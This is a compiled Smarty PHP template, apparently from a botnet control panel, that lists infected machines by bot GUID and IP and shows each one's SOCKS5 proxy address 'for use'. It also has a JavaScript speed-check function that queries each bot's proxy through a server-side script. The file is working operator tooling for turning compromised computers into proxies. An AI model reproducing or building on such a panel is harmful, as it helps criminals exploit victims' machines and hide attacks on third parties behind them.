<?php /* Smarty version Smarty-3.0.6, created on 2011-02-19 21:06:02
         compiled from "/var/www/maincp/client/templates/socks5.tpl" */ ?>
<?php /*%%SmartyHeaderCode:9594670614d6030ba0d2309-82496558%%*/if(!defined('SMARTY_DIR')) exit('no direct access allowed');
$_smarty_tpl->decodeProperties(array (
  'file_dependency' => 
  array (
    'cc13d25724b757c945cf89a4e1605409ce134dd9' => 
    array (
      0 => '/var/www/maincp/client/templates/socks5.tpl',
      1 => 1297864331,
      2 => 'file',
    ),
  ),
  'nocache_hash' => '9594670614d6030ba0d2309-82496558',
  'function' => 
  array (
  ),
  'has_nocache_code' => false,
)); /*/%%SmartyHeaderCode%%*/?>
<script type="text/javascript" defer>
function getSpeed(id, ip, port) { load('./mod/socks5_check.php?s=' + ip + ':' + port, id); }
</script><center>
<h2><b>Server</b>: <?php echo $_smarty_tpl->getVariable('HOST')->value;?>
</h2>
<hr size='1' color='#CCCCCC'>

<table width="720px" cellspacing="0" cellpadding="0" border="1" style="border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;">

<th width='20px' style='background: rgb(80,80,80); color: rgb(232,232,232);'>#</th>
<th width='480px' style='background: rgb(80,80,80); color: rgb(232,232,232);'>Bot GUID</th>
<?php if (isset($_smarty_tpl->getVariable('SHOW_BOTS_IP',null,true,false)->value)){?>
	<th width='180px' style='background: rgb(80,80,80); color: rgb(232,232,232);'>Bot Ip</th>
<?php }?>
<th width='220px' style='background: rgb(80,80,80); color: rgb(232,232,232);'>IP:Port for use</th>
<th width='120px' style='background: rgb(80,80,80); color: rgb(232,232,232);'>Speed</th>

<?php echo $_smarty_tpl->getVariable('GEOIP')->value;?>


<?php  $_smarty_tpl->tpl_vars['REC'] = new Smarty_Variable;
 $_from = $_smarty_tpl->getVariable('CONT_ARR')->value; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array');}
if ($_smarty_tpl->_count($_from) > 0){
    foreach ($_from as $_smarty_tpl->tpl_vars['REC']->key => $_smarty_tpl->tpl_vars['REC']->value){
?>
<tr><td align='center'><?php echo $_smarty_tpl->tpl_vars['REC']->value['I'];?>
</td><td align='center'><?php echo $_smarty_tpl->tpl_vars['REC']->value['GUID'];?>
</td>
<?php if (isset($_smarty_tpl->getVariable('SHOW_BOTS_IP',null,true,false)->value)){?>
	<td align='center'><?php echo $_smarty_tpl->tpl_vars['REC']->value['IP'];?>
</td>
<?php }?>
<td align='center'><input readonly value='<?php echo $_smarty_tpl->tpl_vars['REC']->value['HOST'];?>
:<?php echo $_smarty_tpl->tpl_vars['REC']->value['PORT'];?>
' style='width: 140px; background: rgb(0,0,0); color: rgb(0,255,0);'></td><td align='center'><a href='javascript:void();' id='spd<?php echo $_smarty_tpl->tpl_vars['REC']->value['I'];?>
' onclick='getSpeed("spd<?php echo $_smarty_tpl->tpl_vars['REC']->value['I'];?>
", "<?php echo $_smarty_tpl->tpl_vars['REC']->value['HOST'];?>
", <?php echo $_smarty_tpl->tpl_vars['REC']->value['PORT'];?>
); return false;'><img src='img/icos/info_16.png' border='0'></a></td><?php echo $_smarty_tpl->tpl_vars['REC']->value['GEOINFO'];?>
</tr>
<?php }} else { ?>
<tr><td colspan='5' class='error' style='text-align:center;'>There are no Socks</td></tr>
<?php } ?>

</table>

